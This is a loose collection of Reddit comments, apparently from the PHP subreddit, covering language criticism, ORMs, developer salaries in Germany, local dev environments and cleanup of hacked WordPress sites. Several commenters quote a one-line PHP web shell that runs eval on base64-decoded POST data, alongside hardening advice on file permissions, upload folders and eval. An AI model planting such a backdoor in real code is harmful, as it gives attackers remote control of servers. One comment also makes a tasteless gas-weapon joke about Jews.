Over engineering isn’t a problem exclusive to PHP. 
https://github.com/christianblos/symfony-di-annotation - Configure your Symfony Dependency Injection Container by using annotations in classes. Just add @Service to a class and it will be added to your DIC automatically.
On a totally unrelated note, here is [Linus Torvalds ranting](http://lkml.iu.edu/hypermail/linux/kernel/1711.2/01701.html) about how anyone who thinks it's a good idea to deal with software bugs by crashing is a f*cking moron.
More time to beat on a dead horse?
Imho, v7 is too late. If a biz didnt move away from it before 2015 or so, then they didnt invest in their code and you'll be working on a legacy codebase that is fragile. Some shops were quick to leverage v7, but my bet it's mainly new dev in an isolated system. 
&gt; and instead of crashing with an error... it just returned false! Basically it returned an error code rather than throwing an exception. That's due to PHP's ancestry with C. C doesn't have exceptions, so all errors are communicated through error codes.
You don't even have to get technical to explain it. * ubiquitous in a huge low barrier to entry field with the biggest spotlight = lot's of players means lot's of haters * easy to get into + very forgiving means a lot of limited/lazy devs = lots of shit code around * that plus chaotic unplanned growth = justifiably got a very bad rep and that is very hard to shake * you can make ok money with wordpress with little knowledge and experience and call yourself a dev = elitists hate that (a lot of those in the field) A lot of crap that PHP get's is justified but a lot of that hate is also from people riding the meme train that haven't touched it since 2005 if ever. 
I'm also a full-time front-end dev, and I have to disagree. People are learning how to code through frameworks before learning how to code in vanilla javascript. And the worst part is that they're not even learning how to do it the right way. I can't tell you how many web apps I've had to fix, because they were supposed to be Angular, but they were littered with jQuery. One site was a car company's financial site, and the code behind it was absolute garbage. I'm talking a million hits a day here, and they hired a team of people to build their site, and it was horrrrrible, and I had to go in with a team of people and fix it as much as possible. I still never even got to fix it completely due to time and budget constraints. And on top of that, every project has to start with 100 new libraries where each one has its own 100 dependencies, and if you don't set specific versions or check in your node modules, you end up with weird errors and "it works on my machine!" And let's not forget Typescript! Because now there's functional programming, OOP, and prototype coding. There's also ES5, ES6, and ES7. JS is ridiculous right now. React is throwing HTML in the JS; Angular is throwing JS in the HTML. Every framework has its own way of doing things, and the internet is littered with wrong ways to do things... or things that WERE the right way 2 months ago, but aren't any more. There's so much shitty code out there, I'm surprised JS isn't the butt of every coding meme right now. 
PHPs error handling is my single biggest issue with the language
My comment was partially in jest. PHP has some mess in its core. However, it is our task as developers to write maintainable software that solves a business need. Part of that mission is to test our code. Unit tests would have given you early feedback about assumptions (in this case, regarding how you should use PHP's core in the system under test). You would have been able to track down the bug in a couple of minutes. If you had used a smarter editor/IDE or a linter, you would have been able to find the bug in a couple of seconds. This is especially vital if you change the environment your assumptions were based on (the PHP version). Edit: *You* refers to the one I originally responded to.
“Just FTP and drag and drop.” Developers still do this‽
Kernel Panic is not the same as "it's a good idea to deal with software bugs by crashing" as a general rule. He specifically doesn't have a strong opinion on userspace. There are lots of systems that are older and more stable specifically because this approach leads to large stable systems (like in telecom).
I feel like this article was just getting started and it abruptly ended. 
You should install a honeypot to collect and log any code execution attempts.
https://media.giphy.com/media/94EQmVHkveNck/giphy.gif
This gif is so multi talented. 
 &gt; Could PHP's Doctrine be considered as a rough equivalent of Python's SQLAlchemy Yes &gt; which one is the best ORM in PHP world? The one that goes closer to your business requirements. Rich domain models play best with Doctrine ORM, while anemic domain models are generally a better fit for lower-level abstractions like table-data-gateway (see Zend\Db) or the ones mentioned by /u/fractis at https://www.reddit.com/r/PHP/comments/7fjfho/could_phps_doctrine_be_considered_as_a_rough/dqccy01/ &gt; I've heard good things about Doctrine, but some people also say that its heavy and has an overhead on your application. For normal day-to-day operation, the ORM will not add noticeable overhead, but it will become a memory and CPU issue as soon as you start loading too much data within a single (typical) page load. It is designed to be used in OLTP applications, not in OLAP. To make it simple: you use the ORM to perform a write-related transaction, not a large reports over thousands of records. For those read-intensive operations, I strongly suggest skipping directly to TDG, DBAL, or even directly SQL and PDO where you need to squeeze out performance. &gt; I'd like to know from experienced guys that how well Doctrine fares as a db-layer in resource consumption? It is quite resource greedy, but like any good ORM abstraction (which are leaky by design, usually) it is supposed to be worked around when dealing with problems it wasn't designed to solve. Over the past 5 years, I've used the ORM more and more, and less and less advanced features of it, focusing on richer domain models, better DDD-style architectures and achieving massive performance improvements by just keeping things decoupled. I must say that the biggest strength of the tool is that it mostly stays out of your way, allowing you to focus on what is important, and allowing you to kick it out where reducing resource usage overhead is critical. I would unlikely ever build another application starting from a basic SQL abstraction: too much waste of dev resources. Instead, move towards SQL when it is a requirement, and keep your read and write models decently separate to always make that move viable. 
I never said php was a poor language. I just develop in both.
Exactly my thought :-)
Was there more to it? It was only a few lines of code that said if (isset($_POST['n89024b'])){ eval(base64decode($_POST['n89024b'])); } 
Work email is required then asks you for a lot more information about the company. Care to share what the ebook entails?
Really interested in how to find out how the code got there in the first place. I’ve had this happen to several Wordpress sites over the years. I tried doing this once and spent maybe 7 hours decoding strings and eventually quit. 
I never noticed that much negativity towards JS until the last few years (besides cross-browser woes which are hardly JS’s fault). Funny enough I *have* noticed an increase in very poor JS tutorials/videos by people who clearly don’t know the stuff well enough to teach it - which is exactly what PHP’s problem was years ago. 
It’s funny that a core PHP developer has such a strong opinion this way. I’m interested to know, why do you stick with PHP instead of contributing to a different language instead?
Unexpected EOF.
I don't know, was expecting it to end with some sort of philosophy on security and the dangers of `&lt;insert couple paragraphs here/&gt;`. ¯\\\_(ツ)\_/¯
One of the biggest defenses against hacks like this is not wordfence, or ninja-whatever, or elaborate firewalls... it's making your filesystem non-writeable. the huge majority of exploits I've seen and cleaned up over the years all involve someone able to write a file like the one in the article in to a publicly accessible folder on the filesystem, then executing it via an http call. In *most* of these cases, there's no need to allow writing to the filesystem all the time. Disable it, then re-enable when need be, and disable again afterwards. For *many* situations, this is perfectly doable, and will prevent a large number of exploit attemps from being successful.
Your question doesn't really have anything to do with PHP. You should really ask this in a Litecoin forum instead. 
That is a bit typical for Joomla. They create abstractions with no added value. Just look at the query builder and ask yourself: "Why do I need a query builder if I still have to escape all my variables?" Don't look at Joomla if you want to see good abstractions. Check out the Laravel query builder instead.
Is there an AltPHP on Reddit because this one sucks. Every time you ask a question here, like say you are trying to use PHP with Stripe or an MVC framework, and people want to direct you to some subreddit that's either hasn't had a post or response in months, or has 1000 subscribers. I'm getting pretty sick of the fiefdom here. It's why I barely post here anymore. This subreddit is almost becoming as bad as Twitter.
I feel you pain. It clearly states in the sidebar: &gt; /r/PHP is not a support subreddit. It's to discuss PHP and the eco-system. You could try /r/phphelp, but again, your question is a Litecoin question, not a PHP question. Maybe you could break your question down into smaller, more specific questions, and you could try Stackoverflow. 
Really? Facebook is in so much trouble because of php, that they actually wrote their own language, and VM, Hack. Hacks new goal is not to be php but to be its own language. Facebooks choice of using php has literally cost them millions and millions of dollars. Dont know about slacks tech stack. I guess it could be anything, its basically a slower version and copy of irc. If slack indeed uses/used php as transport for sockets for realtime stuff its just mad. Cant even think about how much money they must be pumping to servers.
Turn error reporting off. XSS and CSRF prevention if you need to prevent it. 
http://lmgtfy.com/?q=php+vulnerability+scanner
Any tips or pointers on where to get started with setting up a honey pot? From my google searching I was able to find examples of honeypots for form submission, but I am having trouble finding anything related to logging malicious code execution attempts.
Bullshit marketing it is. :)
I feel the exact opposite. JS is saner than it has ever been. I was forced to re-learn vanilla JS after years of jQuery abuse. Client-side app development has never been as lovely as it is now. Do you remember ExtJS? I do. It still haunts my dreams.
&gt; because async doesn't help much with http requests What? The single-threaded asynchronous nature of JS is exactly what helps IO.
Because of rate limiting?? If you fire 20 requests at the site I’m passing you get a cancelled connection for most of them, you can’t spam requests which makes async not useful in this situation 
Ah! That makes sense.
Go through the OWASP Top 10, and see how that is applicable to your application. Also: - strong ssl ciphers - hsts - secure/httponly attributes on cookies - session_regenerate_id(true) on successful login - captcha after x amount of login attempts - CSRF tokens on every modification action - When uploading anything, do not store in webroot + randomized names - and the list goes on..
So PHP is the deadly gas weapon of the programming world? Cool.. that means it's pretty powerful, as deadly gas killed MILLIONS of the last 150 years.. just ask any German, Belgian or Jew.
A 5-page ad booklet. 
Isn't the file usually put on the server through a vulnerable upload? Write will be enabled for that.
&gt;This obfuscated script indicates that the user of this basically had free reign to run anything on the server at any time. More like "anything the webserver user can run". Which is pretty much nothing harmless on a correctly configured machine.
You cannot simply pick a stack that is going to scale very well and do things extremely well and carefully, especially if you're a startup. You start with something that suits your needs on the start, which could be an easy programming language, or cheap developers, or ease of hosting, or having a wide available community etc. They made billions of dollars because they were quick to enter the market, thanks to PHP. They could still stay on PHP without HHVM or Hack. You take this step only when you're sure that the resources you spend on developing them is lower than the advantages you're getting. If a few miliseconds of performance boost makes you millions of dollars, then you do it. It's not something language specific.
I use Visual Studio and an add-on called PHP Tools. Before PHP, I mostly coded in C# so it's really convenient. The debugger is great, the intellisense on different file extensions, just everything about it is nice. That along with being able to run my code in any browser without needing to use something like Apache. Its just really handy
Just downvoted for this statement: "ircmaxell did an experiment in PHP userland for fun and profit (do not use this in prod of course)."
While the entire thing is only based on docblocks, it is still a brilliant addition. This really improves types for anything built on the fly, like anonymous classes and generated code. :+1:
And why you have given permission to Apache in that folder that can run PHP? You need to disable PHP in the folder where you upload images and mp3s and videos. There is no need to run PHP there.
One possible solution is to disable ´eval´ from php.ini.
&gt; Let phpstorm sync your files on save over sftp to your container (setup proper path mapping) Could you tell me please where would I configure this in PhpStorm?
https://confluence.jetbrains.com/display/PhpStorm/Sync+changes+and+automatic+upload+to+a+deployment+server+in+PhpStorm
Oh, it is in the Deployment config. Thanks!
No they don't. It just a fun banter. Also as one wise man said: There are two types of programming languages. Those that people complain about and those that nobody uses.
Nah. You need to enable PHP in your codebase folder. Even single folder more and you have security hole waiting to be abused. That's that sound sick? It is. Also never mix codebase and static assets and what not. Also never make codebase folder writable.
Haters gonna hate
Query builder could still provide structural validity of result. Or maybe it's just to show what operations are possible at given stage.
True, but I don't believe Joomla does that. It's an extremely thin layer on top of the functions that already exists in PHP.
[I don't think we have to worry](https://w3techs.com/technologies/history_overview/programming_language). Even though PHP is my main source for income, I also giggle a bit when I see memes like that. 
there's perhaps 2 or 3 PHP files that should be publicly accessible - almost everything else could be moved outside the document root. however, I think all files are in document root - publicly accessible - by default for ease of installation. 
Make sure your web server does not have write permission to where your code is.
You'd need to define 'vulnerable upload'. Are there actual PHP or Apache flaws that can allow for this, despite config settings? Probably, even to this day. But... the majority of exploits I've seen were things like thumbnailing code being passed compromising data which cause it to write a file to a public folder. If those public folders are not writable, such an exploit *generally* won't work (because Apache/PHP/OS won't be able to write it there in the first place). We're primarily talking about Wordpress here, even though it's a general technical problem. The WP community - both core and the large ecosystem of themes and plugins - has, for years, prioritized ease of setup/installation and backwards compatibility over security. Even a warning that all your files are in public doc_root folder, with a link to instructions on how to harden by moving those to another folder - that would prevent numerous compromises. Default Wordpress, configured with a plugin to only use an external host (like S3) for media assets, and all file and paths set to non-writeable - would prevent a larger number of standard compromises. This *would* prevent the 'automatic updates' from happening. Personally, I've not experienced that as a problem, because the majority of exploits you'd need immediate protection from .... would need to write to the drive as well. When you see there's an update, enable the file paths to be writeable, install the update, the disable write permissions again. You're giving up a small bit of convenience for a disproportionately larger amount of security.
&gt; This subreddit is almost becoming as bad as Twitter You have a talent for correlating unrelated things...
I find it fascinating that these people go to the lengths of doing 'isset' checks, vs just suppressing errors. eval(@base64decode(@$_POST['n89024b'])) 
Troll Best Practice, Page 1: don't post memes, RFC's work better 
Good jokes. Sadly I do not get Rust joke :( Rust is doing just fine in concurrent programming. Or is that clue of that joke?
Javascrip have well known meme "Good parts vs definite guide". Do we have such meme for PHP? If so I haven't seen it. So meme had to snipe at PHP in general ;)
It's true in very limited specialization of web design.
Hate of procedural PHP is so pase this day. How could You even brought it up! Scandal. Cool kids this days hate InvertebrateFishInterface. ;)
Your basic vulnerable upload is simply not taking the time to validate the file and putting it accessible on a web folder. Your average dev is unaware of the average vulnerabilities that are easily possible. 
"Test"? Tests do not find lower bounds on issues, and in case of function with well known number of arguments you can have mechanism that rule out all missuses! Static typing for the win. (Tests really start to shine where we can't provide invariants at a level understandable by static checkers.)
&gt;Don't look at Joomla if you want to ~~see good abstractions.~~ build a site without wanting to hang yourself FTFY Also, if you want something smaller than laravel, or something with a little less handholding, check out fat free framework. 
With modern deployment techniques I do not think any php code need to be placed in writable dirs. Deployment service use separate authorization path.
Nice rant. :) But I was merely point out that English is flexible enough so that variables can be swapped if we change predicates accordingly. Humans who specify requirements will do this on their own. Hence arguing for strict adherence to one of those two is pointless or harmful. It's only when we have some concrete values order starts to matter. PS Do you write your code in language different then english? What benefits does it give?
From abstract: "How mobile services company Simpel perfected enterprise PHP" Pretty much sums up what it is.
Im always surprised how sensitive PHP developers are. I mean someone made a meme, so what. However, more than likely its just devs on Reddit. I have not yet met PHP developer in real life who is so insecure as to be saddened by memes. 
This subreddit is basically dead
Third paragraph need more love. Bigger issue is lack of compassion or guidelines on when to use one and where to use other. (This is compounded by interface example that could easily be rewritten with abstract class without loss of any functionality, or usefulness) Nor is there much info on differences between the two. (E.g. class can implement multiple interfaces but inherit from at most single class.) Tee/Coffee example is ok. It show how complex algorithm can be reused with inheritance.
thanks for your valuable comment
Back when jQuery was prominent, people were learning to code by abusing jQuery, and hardly, if ever writing tests for client-side business logic. Now frameworks promote using standard ES features, functional patterns and testability. Of course every framework does something their own, thats the point of building different frameworks. Frameworks in every language always do things their own way. &gt; React is throwing HTML in the JS; Angular is throwing JS in the HTML. (Good) frameworks are pushing the web towards components — the only sane way to build web UI's. If you don't understand or accept this you aren't going to have a job in the next few years unless you love building Wordpress sites for a living. Keep talking in hyperbole though, it will _definitely_ drive your point home.
 [Ytrace](https://github.com/yangxikun/ytrace) is a php debug/trace tool. It can trace php execution, then output traced information to file. [ytrace_gui](https://github.com/yangxikun/ytrace_gui) can load traced file, show execution detail and debug the execution. See also [ytrace_chrome_extension](https://github.com/yangxikun/ytrace_chrome_extension). Feature: 1. step through debugging 2. break point 3. jump to any executed source code line 4. step back through your step history
Because I’m familiar with it and it’s fun. PHP’s problems make it more interesting to work on.
Very interesting to realize that I was using union types when I sometimes meant intersection! (e.g. the mock example, collections, etc.)
Why would anyone go through the trouble of obfuscating all of that code except to give away that the code was hacked? I mean, would ANY of you ever see anything remotely similar to that rearrangement of an array in your code?
So it will not show up on a random search for 'base64' or other keywords.
You would want to use an IDS like AIDE.
True indeed.
No, I write my code in in English too. My rant was copy pasted from an example as to why [English is weird](http://mentalfloss.com/article/49238/7-sentences-sound-crazy-are-still-grammatical). I just always get a chuckle when people argue about how "unnatural" sentences sound, because English is and odd choice to be basing "natural" on.
&gt; And even more is utter garbage. This?
Pure awesomeness. Now I will turn into a monster... Thank you ;)
Truth is I wrote this expression without much thinking at the time of writing, then it failed to ring a bell when I read the article again before hitting *Publish* (I am not a native english speaker). Of course this does not fit Anthony Ferrara at all. I edited the article... Thank you for pointing this.
I agree, I didn't come here to defend Javascript and not PHP... I worked in Laravel years ago on an enterprise level and it was pretty damn awesome.
There are already several transpilers: https://packagist.org/packages/nikic/php-parser/dependents I'm not sure it's a great idea though, as PHP is an interpreted language. I guess you can create your own PHP flavor for yourself, but a globally shared PHP transpiler sounds more like a fork than anything else. 
 External perspective hackertarget.com - Cheap lots of good scanners and tools www.websecurify.com - Cheap has a really good DAST that will find some sql injections www.ssllabs.com - Free and teaches you how to get an A score securityheaders.io - Free teaches you how to get an A score and will protect your app from code errors like XSS Internal perspective https://www.ripstech.com/ - Cheaper but really good static code analyisis Study OWASP, Make sure you are using Prepared statements for Database queries, Code Reviews! If you have money to throw at the problem, you should look into an IDS and WAF 
This is good starting point. Thanks.
This is really helpful. I'll definitely look in to everything.
Wouldn't it be a pain to update the code?
Depending on the size and scope of your project, you might want to hire someone experienced to do a formal penetration test on your site. I went through this for the first time this year. We all assumed our code was "pretty secure", of course, but we needed a third-party pen test for various compliance reasons. After seeing their findings, I quickly went from thinking "this is such a waste of money" to "we need to have this done on a regular basis". If your app accesses a large database of people's information, highly consider it. 
Do you have any recommendations on who I should hire?
I don't necessarily think PHP developers are sensitive, I do think we catch a slightly unfair amount of crap from other developers and when it borders on actual elitism and a real sense of "I'm better than you because of our respective choices in languages" it gets aggravating. That said, I love the jokes. I sent the same pic OP linked to my friend's Slack channel, most of us are current or former PHP devs. We all laughed at it. The funny thing I find, and most of why I'm replying, is that I've started to see the occasional similar joke pop up regarding the JavaScript ecosystem, and man, some of the threads revolving around those gags really got taken serious. 
In all honesty, there's like 3 major JS frameworks and if you learn 1 or all 3, your job prospects are pretty solid. It's really React, VUE, and Angular. Ember seems to be fairly niche and mostly used in particular enterprise level positions. I feel like things have actually started to calm down in the last year or so. Webpack and npm are basically standard of any project, along with Babel (until ES6 is fully standardized). Backend will always be up to the developer and team and there's nothing hamstringing you to anything as far as that goes. 
It depends on the city. Around 60k Euro is average for a senior.
&gt; While the entire thing is only based on docblocks Yes, but the added level of understanding means it won't error when encountering code like interface A {} interface B {} function foo(A $i) : A { if ($i instanceof B) {} return $i; } Which is a bug in the 0.8x branch (saying that the return type should be `A|B`), but not in master. It's [also a bug](https://github.com/vimeo/psalm/issues/175) in Psalm, which will hopefully be fixed once I add non-hacky support for intersection types.
The average salary in Berlin for a senior PHP developer appears to be 50k. 
Are you a dev based in Germany?
That's what I gathered from Googling, but a friend who lives in Hamburg told me it seemed really low.
Berlin pay is generally lower than other cities in Germany. But also has a lower cost of living.
What? interface A {} interface B {} interface C extends A, B {} // intersection // union abstract class D implements A {} final class E implements A {} final class F extends D {} function doSomethingWithAUnion(A $a) {} function doSomethingWithCIntersection(C $c) {} Apparently, PHPStorm can extract an interface from a concrete implementation, so there is any reason not to use interface?
I suppose it's 60k gross? How much after tax?
TIL I make more as a mid in the U.S. than a senior in Germany.
Depends on how much time and effort you want to put in. Are you building an important application or a one off content site?
Because it's easy to learn and it does not enforce any standards or particular way of doing things so any retard can pick it up and create disgusting spaghetti code. I think the hate comes mainly from people outside PHP that at some point had to cleanup somebody else's mess.
Great. So if /r/PHP is for stuff dealing solely with PHP and nothing else, then I have just created this subreddit: https://www.reddit.com/r/altphp/ 
I saw a demonstration by ripstech at phpworld. It looked like a great tool.
You must know more than PHP after these 5 years of experience. Elaborate a bit the list of other things you experienced and you can get a more appropriate answers. I can help evaluating your seniority based on the answers of following questions: * What is the framework you use written in PHP? Why would you use it into your next project instead of another one from the market. * What was your involvement in your last project, how big it was, what were the challenges you faced along the way. * What technologies where used / you are familiar with in terms of automatic deployment, continuous integration * Where was your application deployed? Did you use amazon cloud or google cloud? Where you following a microservices-style architecture for the project? * How confident are you with Linux? Are you able to write and understand a command that contains 3 pipes and one output redirection? What is the difference between stdin and program arguments? Will you be able to implement a program like xargs in PHP? * How much can you tell about protocols like AMQP or websocket? Feel free to mention any others that were used in your past project. * What standards are you familiar with? OAuth? openid connect? Feel free to mention any others that were used in the past project. * From 1 to 10, how much you think you know the protocol that your language was designed for: HTTP. If your answer is above 7 - as it should be for a senior, point out few caching techniques at the protocol level. I could go on with the list. I can enter in details in any of these questions - I'm a 5 years of experience developer that is working in Germany, with PHP as the first programming language. Switched to Java after 2 years. 
[JavaScript: The Good Parts](https://i.imgur.com/wR3ZxfB.jpg)
Elaborate on updating the code. I think what /u/icosa is getting at is your app should be stateless and the platform/app shouldn't have to write to the server it's on (besides the /tmp folder). This is good for security and scalability. http://www.brainbell.com/tutors/php/php_mysql/Building_Stateless_Applications.html
I've spent 3 years of my life on it so it's pretty important to me.
PHP Dev in Hamburg here. 57k - 60k per year seems to be the norm when you start a new job.
You also have no health care.
Yes, for anything that is an on-the-fly generated type: not everything is user-defined. The simplistic example is PHPUnit mocks, but in general it is indeed about dynamically performed decoration. 
You say it's an error but `$i` was an `A` when it was passed, it was not modified, and it returns A. Where is the error?
For example if I make changes to a php file and upload it to the server, I'd have to provide write permissions everytime and then change it back to no write permissions every time. I think my site is already stateless so that's good to know.
And no infrastructure
 * 30k for the newly arrived immigrant * 40k if you're a junior German dev (fresh from university) * 60k mid * Seen up to 85k for senior roles And yes, if you want more, you can get up to 120k for a boring senior Java position in a bank in Munich :-P 
Thanks for the input! Is that when you start an entry level new job or a higher position?
&gt; interface A {} &gt; interface B {} &gt; &gt; function foo(A $i) : A { &gt; if ($i instanceof B) {} &gt; return $i; &gt; } The problem was with PHPStan 0.8.x: https://phpstan.org/r/fbe42b240fdf9c556e3598155c0af79a But is fixed in PHPStan 0.9-dev: https://phpstan.org/r/57d96a707ae9b6c0e82d5613b27c01eb
It's not an error. It's a bug in the static analysis, where it's treating interfaces in a similar fashion to regular classes. Seen more clearly here: function foo(A $i) : A { if ($i instanceof B) { return $i; } return $i; } `$i` is always an `A` but inside the `instanceof` check, it's `A&amp;B`. PhpStan (master branch) now understands this in the way that it used not to.
And no good food
that varies depending on tax class, children, insurances etc. according to [this site](https://www.brutto-netto-rechner.info/) with no church tax, tax class 1, and no children you're looking at 35k.
It's for a senior position. But this is a minimum (for Hamburg). It depends on the company and your knowledge. Right now everyone is looking for good Php Devs here. If you are good at negotiations you can get more (I'm not :)). I started at entry level with 45k. 
If you're uploading the file via FTP (there's better, more modern ways of doing it), the user you login as shouldn't be the same as the user running PHP and your web host. This may point you in the right direction. https://unix.stackexchange.com/a/30888
This `if` doesn't make sense to me. Just make sure `Foo` implements `BarInterface` in the class definition. public function doSomethingUseful(Foo $object) { if ($object instanceof BarInterface) { // $foo is Foo&amp;BarInterface here! } }
TIL I make more as a contracting mid in NZ than a senior in Germany, but with free healthcare and decent infrastructure :D
You're large cities have lower cost of living? What is this sorcery?
Yep, East Germany kind of sorcery. Fun stat for folk in Germany, https://www.theatlas.com/charts/ByzcK_wK. GDP would be 0.2% higher without Berlin.
Does that mean Berlin is somewhat dire in places? Or is everyone relatively happy there?
Middle management. I hire devs.
It kinda means the rest of Germany pays for „the adult version of Disneyland“. Somethings like bureaucracy is bad (to the point they don’t issue fines because they know it’s so bad) but that’s about it IMO.
Good to know!
Actually, I have been browsing for PHP jobs, and I saw a lot from Germany. I was a bit surprised. Has it been like that for a while, or is it the demand new?
Well, I can't speak for everyone but I do. Would 60k/year in Germany be gross pay? Before any taxes/health benefits taken out and paid for or how is the healthcare funded? Even after my benefit costs and taxes are taken out, I still make a bit more than a senior dev in German.
Any decent company in the US will cover health insurance and more, especially for devs.
I heard Berlin is a really fun place to live for younger to not-so-younger professionals.
Are you factoring in exchange rate? 60k euro is like 90k USD
I just input it into google for what 60,000 euro in USD would be, to be honest. https://www.google.com/search?q=60+000+euro+to+usd
Kinda like https://github.com/sebastianbergmann/phpunit-mock-objects/blob/master/src/Generator.php?
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [sebastianbergmann/phpunit-mock-objects/.../**Generator.php** (master → 43ac35d)](https://github.com/sebastianbergmann/phpunit-mock-objects/blob/43ac35d1620d57b3d3b8df3967130e1a589be551/src/Generator.php) ---- ^(Shoot me a PM if you think I'm doing something wrong.)
Right, ppl go to Germany for food and to France for cars.. oh waaaait...
The documentation covers this entire topic pretty well. http://php.net/manual/en/language.types.string.php
How much do you take home after tax? 'Cause taxes here in Portugal and most european countries are pretty brutal.
Fuck you're right, that's my bad. I'm canadian so I converted it to CAD not USD.
90k is on the higher end for canadian salaries.
Es6 was finalized in 2015. We're moving into es2017 and 2018 now. JS still moves fast when a brand new thing comes out. The amount of new *good* frameworks have sort of slowed but the components that make up that framework still move fast.
This is correct. It's a big security issue if your code can modify itself. Infected PHP sites where some horribly obfuscated code appears at the top of some files was probably made possible because of a bug PLUS the fact that the web server, probably using PHP, was persuaded to write to the PHP files. It's much more difficult for a hacker to do something like that if file permissions prevent the web server writing to code files. The code files are often writable by the web server either because someone didn't know any better or to enable easy "push this button to upgrade this module" from the admin control panel. That can be convenient but it comes with a risk which is best avoided by pushing code via some other means. I wasn't thinking of statelessness. That's a different issue.
Many different ways but they usually start with SQL injection, remote file inclusion (RFI), FTP, or even XSS. Then scan for writable directories and their path from the webserver. Another way is if you have a blog that allows for media uploads, they hide PHP code in the meta data. This way they can upload a profile picture and they know any page that has that profile picture and had the meta data parsed, their code is accessable. Then they access the asset that accepts a post, query, or request statement and figure out the file structure of your webserver as well as more writable directories, read the db config info, hijack the admin, etc. Shopping cart pages are a gold mine since in most countries you cannot log CC numbers and PI Info, most sites do not even attempt to log anything on those pages so they can try numerous attempts without much worry. At this point they have a semi-persistent connection to your webserver. Most just want your database or to ransom your admin but others will sniff your network traffic looking for hosts, and enumerate firewalls and routers within the network. TL;DR: Never trust any user input, disable PHP execution in any writable directory, and log as much user activity as you can.
I’ve been trying to get Homestead to work for the past 3 days.. I think Vagrant/VB updates broke something for me recently. Been having issues with rsync trying to use the cygwin binaries (which isn’t even installed) rather than Git for windows. I’ve reinstalled everything many times over and I’m just lost at this point. About to just setup a custom VM because I’m running out of time on a project. 
It all depends on your problem. I don't necessarily agree with just throwing languages at it, but service oriented architecture has its place regardless of whether or not they're on the same machine. Or are you taking specifically about his languages comment?
Especially if you like techno and drugs.
Or 20 to 30 days of paid vacation.
This is really interesting. Thank you.
What's the modern way?
Well, you certainly don't go to the US for good food for sure :P
sign me up
I use composer for package management, Puppet for server management, and have my own scripts to pull from a git repo, install everything and change the wwwroot to go live. Here’s a decent article about it. https://blog.codeship.com/setting-up-and-deploying-a-modern-php-application/
40% tax rate? Holy! 
Sounds like possibly Vagrant issues rather than Homestead. Try going back to Vagrant 2.0.0. 2.0.1 has shown to have some issues on Windows. What are you doing with rsync? Haven't seen any reports of issues. Also try using http://cmder.net/ it's leaps and bounds better than anything else I've seen.
This is really helpful. Thanks!
No problem. I fought it for a long time but the thought of going back to no package management and FTP is nauseating. It’s worth the learning curve. 
Why not? Think we can't Point meat paper thin and deep fry it or make sausage links?
I gave up on Vagrant entirely and now I use Laravel Valet-Plus, which doesn't use VMs at all. It's been so much better.
String interpolation is essentially syntactic sugar for string concatenation. There is no real difference between `"Hello, $name!"` and `"Hello, " . $name . "!"`.
Yeah, I'm currently using Laravel with VirtualBox on my local machine but I guess I'm going to have to figure out how the package management stuff works. Really appreciate the help.
Thats great if you're on a mac.... I'm really getting fed up with whole projects ignoring devs on windows. I'm always feeling like a second class citizen, even though its still by far the most common OS to develop on. 
If you're on Windows, try Laragon.
But honestly I don't know how I would get by doing web dev on Windows.
I've put in a ton of effort in the last year to get Homestead working as well on Windows as it does on Mac / Linux. If you have suggestions I'd love to hear them: https://github.com/laravel/homestead/issues/new
Great! We'll deploy your machine into production! Kidding of course. My complaint with nearly all non-container and non-virtualized dev environments is it's not the same as what you're deploying to. You *could* be missing bugs that will only appear in production. I admit I'm biased towards Homestead and Vagrant.
It's getting better with every Windows 10 update. I have a near match of my MacOS based development environment on my Windows 10 gaming rig. There are a few differences but overall, it's pretty close.
Well almost everything in my work is small scale and in WordPress. And we always deploy and then test for platform specific bugs before launching. But I will be honest that little about my normal process is industry standard.
I did the same thing, got Windows 10 on my gaming pc and started trying to get a working dev environment matching what I have on my mac for work.
You can not live in the suburbs where infrastructure is inherently bad because cost per capita.
That's all you get for a senior java position at a bank?
I work in the US. I have 25 days PTO. I have great health insurance and access to the best hospitals in the world. You forget, it's the poor that get shit on in our country. Senior level software engineers have it pretty good.
[removed]
Since you're using Docker for Mac, also make sure your mounted application volume is using the `:cached` flag. My application was basically unusable w/ Docker until I enabled this flag.
I’m using rsync rather than the default file sync for Homestead. I need to exclude certain files, and I don’t know/think that there’s a way to do so without using rsync. I’ve also tried various versions of Vagrant but nothing seems to work. Same error about a cygwin (again not installed) mismatch error when it tries to sync the folders. 
Might have to give that a shot. I really don’t have time to deal with this issue so hopefully Valet will be at least a temporary solution. 
This is a nice list, actually, thanks.
If you're on Windows, I highly recommend Laragon.
Will be checking it out ASAP. Thanks! 
You can also get more than 85k for PHP work in Munich as a senior, but it’s the exception, not the norm
There's a shitload of properly good Mediterranean food places here. Properly good, not just "I read about this recipe on a book".
Yeah, but life quality is much much different, as noted in other threads in here.
Don’t forget the cost of living. I made more money in NZ than in France but it cancelled out in the end.
Why not fork it and make a pull request then?
I work remotely in the rurals so it negates that a bit
Could ask you the very same thing.
Very clear explanation, thanks! 
Ok ok it's getting salty, it's just Reddit
A lot of people here say norm is around 3 weeks with a bump to 4 weeks after 5 years: https://www.reddit.com/r/cscareerquestions/comments/3gvuji/how_much_vacation_time_do_you_get_what_is_typical/ This quora answer has some numbers for the big companies: https://www.quora.com/How-many-paid-vacation-days-do-the-big-tech-companies-give-to-first-year-engineers - Amazon: 10 days (1st year), 15 days subsequent years. - Apple: 12 days - eBay: 16 days - Facebook: 21 days - Google: 15 days, 20 days starting 4th year, 25 days starting 6th year - IBM: Unlimited / Untracked - Microsoft: 15 days + 2 personal days, 20 days + 2 personal days after completing 6 years, 25 days after completing 12 years - Netflix: Unlimited / Untracked - Yahoo: 15 days - Oracle: 13 days - NVIDIA: Unlimited / Untracked Sounds like you have it pretty good with 25 days.
The concept "after tax" in Germany includes mandatory fee's for social security (~9%), health care (~7%), unemployment insurance (~2%) and care insurance (~1%), which are in addition to the tax rate. You pay the highest tax rate of 42% for every Euro earned over ~53.000€. Optionally for state church membership (catholic or lutheran) you pay an additional 9% on the sum of social security, health care, unemployment, care insurance (so 9% of ~19% before). But you can avoid that by stating that you are not a member of any church. Mandatory benefits as a employee in Germany include: - 20 days of vacation, but if you don't get 26-30 days as a senior software engineer, then the company is screwing you. - depending on the state between 6-11 bank holidays. Some are always in the work week, some fall onto weekends. - pay for 6 consecutive weeks of sickness, after that health insurance kicks in, but this depends on your selected tarif. - up to 12 months of maternity/paternity leave at ~60% previous pay by dividing 14 months up with your spouse (example, 7 month each). - 5 days of further education / off the job training. this is usually solved by sending you off to a conference one or twice a year or getting inhouse training. - if you earn below something I think 75.000€, then overtime has to be paid. passages in contracts stating "overtime is compensated with the regular salary" are invalid below that salary of 